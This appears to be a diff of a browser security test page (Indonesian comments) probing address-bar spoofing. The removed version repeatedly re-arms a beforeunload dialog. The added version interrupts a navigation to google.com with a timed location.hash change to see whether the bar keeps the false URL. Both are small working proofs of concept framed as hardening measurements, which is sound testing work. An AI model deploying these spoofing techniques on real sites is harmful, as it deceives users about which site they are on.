@@ -1,26 +1,15 @@
-<!-- 14 | F1 · beforeunload DI-ARM ULANG — jendela diperpanjang tanpa batas | [1-CLICK]
-     Kelanjutan 13. Kalau bar memang berganti selama dialog, jendelanya = lama dialog terbuka.
-     Di 13 itu ditentukan pengguna. Di sini penyerang mengambil alih: setiap kali dialog
-     ditutup dengan Stay, navigasi ditembak LAGI, jadi dialog muncul lagi.
-     Efeknya: keadaan "bar menulis tujuan, layar menampilkan halaman ini" bisa dipertahankan
-     selama yang diinginkan, bukan sedetik-dua detik.
-     DIBATASI KERAS: maksimum 5 putaran, lalu berhenti sendiri. Ini pengukuran, bukan jebakan -
-     pengguna harus selalu bisa keluar. Tekan Cancel pada putaran mana pun untuk berhenti.
-     YANG DICATAT  pada putaran ke berapa bar berhenti berganti? Apakah browser mulai menekan
-     dialog berulang (Chrome membatasi dialog tanpa interaksi)? Itu batas hardening-nya.
-     EXPECTED-SECURE  bar tak pernah berganti, DAN browser membatasi dialog berulang. -->
-<h2 style="font:20px system-ui">HALAMAN PENYERANG</h2>
-<button onclick="go()">Run 14 (maks 5 putaran)</button>
-<button onclick="n=99">STOP sekarang</button>
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!doctype html><meta charset=utf-8>
+<!-- PREDIKAT: bar tetap melukis google.com padahal navigasinya sudah dibuang
+     ORACLE: klik go -> screenshot bar + panel. Ulangi dengan D = 0 / 50 / 200 / 600 ms, catat mana yang menahan
+     CONTROL: hapus baris setTimeout(...)  |  EXPECTED-SECURE: bar kembali ke URL nyata -->
+<button onclick="go()">go</button>
+<pre id=p></pre>
 <script>
-var n = 0, T = 'https://www.google.com/';
-g.textContent = 'REAL ORIGIN: ' + location.href;
-addEventListener('beforeunload', function (e) { e.preventDefault(); e.returnValue = ''; return ''; });
-function draw() { g.textContent = 'REAL ORIGIN: ' + location.origin + '\nputaran: ' + n + ' / 5\n\nBACA OMNIBOX tiap dialog muncul. Catat putaran mana bar berhenti berganti.'; }
-function go() {
-  if (n >= 5) { draw(); return; }
-  n++; draw(); location.href = T;
-  setTimeout(go, 4000);   // arm ulang setelah pengguna menekan Stay
+const T = 'https://www.google.com/', D = 50;
+function go(){
+  location.href = T;
+  setTimeout(() => { location.hash = 'x' + Math.round(performance.now());
+    p.textContent = 'REAL: ' + location.href + '\nclobbered after ' + D + 'ms'; }, D);
 }
+p.textContent = 'REAL: ' + location.href;
 </script>
